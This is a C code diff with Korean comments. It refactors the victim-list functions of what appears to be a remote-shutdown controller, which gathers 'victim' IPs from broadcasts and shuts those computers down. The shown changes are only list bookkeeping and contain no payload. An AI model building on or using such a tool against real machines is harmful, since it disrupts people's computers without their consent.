@@ -26,7 +26,7 @@ void printVictimList()
 }
 
 //피해자 목록에 피해자 IP를 추가하는 함수
-int insertVictimList(char* victim)
+void insertVictimList(char* victim)
 {
 	for (int i = 0; i < sizeof(victimList) / 16; i++)
 	{
@@ -41,36 +41,22 @@ int insertVictimList(char* victim)
 		else if (strcmp(victimList[i], victim) == 0)
 			break;
 	}
-
-	return 0;
 }
 
 //피해자 목록에 있는 피해자 IP를 삭제하는 함수
-int deleteVictimList(char* victim)
+void deleteVictimList(int number)
 {
-	//피해자 목록에서 피해자를 찾은 유뮤를 저장한다.
-	BOOL find = FALSE;
+	//해당 피해자의 IP를 목록에서 삭제한다.
+	ZeroMemory(victimList[number], sizeof(victimList[number]));
 
-	//피해자 목록에서 피해자를 찾으면 삭제하고 나머지 목록을 위로 1칸씩 올린다.
-	for (int i = 0; i < sizeof(victimList) / 16; i++)
+	//나머지 목록을 위로 1칸씩 올린다.
+	for (int i = number + 1; i <= (sizeof(victimList) / 16 - 1); i++)
 	{
-		if (strcmp(victimList[i], victim) == 0)
-		{
-			find = TRUE;
+		if (i == (sizeof(victimList) / 16 - 1))
 			ZeroMemory(victimList[i], sizeof(victimList[i]));
-
-			if (i == sizeof(victimList) / 16 - 1)
-				ZeroMemory(victimList[i], sizeof(victimList[i]));
-			else
-				strcpy_s(victimList[i], sizeof(victimList[i]), victimList[i + 1]);
-		}
+		else
+			strcpy_s(victimList[i], sizeof(victimList[i]), victimList[i + 1]);
 	}
-
-	//피해자 목록에서 피해자를 못찾으면 오류를 리턴한다.
-	if (find == FALSE)
-		return 1;
-	else
-		return 0;
 }
 
 //오류 메시지를 출력하고 프로그램을 종료하는 함수
@@ -142,7 +128,7 @@ DWORD WINAPI broadcastReceiver(LPVOID arg)
 		}
 
 		//송신자의 정보를 저장한다.
-		retval = insertVictimList(inet_ntoa(peeraddr.sin_addr));
+		insertVictimList(inet_ntoa(peeraddr.sin_addr));
 	}
 
 	//통신용 소켓을 닫는다.
@@ -248,6 +234,9 @@ int shutdownVictim()
 
 	//피해자 컴퓨터의 종료 과정이 시작됬음을 알린다.
 	printf("피해자 컴퓨터의 종료 과정이 시작됨! \n");
+
+	//종료시킨 피해자의 IP를 목록에서 삭제한다.
+	deleteVictimList(number - 1);
 
 	return 0;
 }
